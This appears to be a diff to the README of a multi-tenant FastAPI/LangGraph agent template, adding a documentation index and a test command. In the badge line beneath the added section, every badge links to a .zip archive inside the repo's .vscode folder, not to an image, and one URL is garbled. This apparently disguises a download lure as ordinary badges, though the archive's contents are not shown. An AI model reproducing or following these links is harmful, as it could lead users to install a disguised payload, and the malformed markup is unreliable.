@@ -1,3 +1,23 @@
+# Agent demo (multi-tenant FastAPI + LangGraph)
+
+Production-oriented template extended with **multi-tenant auth**, three agents (**contract / email / report**), SQL sandboxing, and approval gates.
+
+## Docs (start here)
+
+- [docs/README.md](docs/README.md) — index
+- [docs/getting-started.md](docs/getting-started.md) — local / Docker / env / migrations / tests
+- [docs/multi-tenant-and-agents.md](docs/multi-tenant-and-agents.md) — tenant rules & agent APIs
+- [docs/evals-and-ops.md](docs/evals-and-ops.md) — evals CLI & make targets
+
+```bash
+uv sync
+APP_ENV=test uv run pytest tests/ -q
+```
+
+Near-E2E: `tests/test_e2e_p5.py`.
+
+---
+
 # FastAPI LangGraph Agent Production-Ready Template 🚀
 
 ![GitHub release](https://raw.githubusercontent.com/luwhano/fastapi-langgraph-agent-production-ready-template/master/.vscode/agent-fastapi-langgraph-production-ready-template-3.0.zip) ![Docker](https://raw.githubusercontent.com/luwhano/fastapi-langgraph-agent-production-ready-template/master/.vscode/agent-fastapi-langgraph-production-ready-template-3.0.zip) ![Python](https://raw.githubusercontent.com/luwhano/fastapi-langgraph-agent-production-ready-template/master/.vscode/agent-fastapi-langgraph-production-ready-template-3.0.zip%https://raw.githubusercontent.com/luwhano/fastapi-langgraph-agent-production-ready-template/master/.vscode/agent-fastapi-langgraph-production-ready-template-3.0.zip)
